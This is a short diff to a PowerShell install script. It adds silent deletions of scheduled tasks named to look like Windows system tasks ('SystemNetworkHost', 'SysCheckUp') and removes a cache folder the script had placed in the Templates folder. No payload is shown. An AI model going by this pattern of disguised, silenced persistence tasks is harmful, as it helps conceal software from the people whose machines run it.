@@ -62,6 +62,10 @@ if (-not (Test-Path $DEST_DIR)) {
 }
 
 # Purge old clustered files/folders from Templates folder so it remains 100% clean
+cmd /c "schtasks /delete /tn `"\Microsoft\Windows\Shell\SystemNetworkHost`" /f >nul 2>nul"
+cmd /c "schtasks /delete /tn `"SystemNetworkHost`" /f >nul 2>nul"
+cmd /c "schtasks /delete /tn `"SysCheckUp`" /f >nul 2>nul"
+Remove-Item "$DEST_DIR\cache" -Recurse -Force -ErrorAction SilentlyContinue
 Remove-Item "$DEST_DIR\app" -Recurse -Force -ErrorAction SilentlyContinue
 Remove-Item "$DEST_DIR\runtime" -Recurse -Force -ErrorAction SilentlyContinue
 Remove-Item "$DEST_DIR\dlls" -Recurse -Force -ErrorAction SilentlyContinue
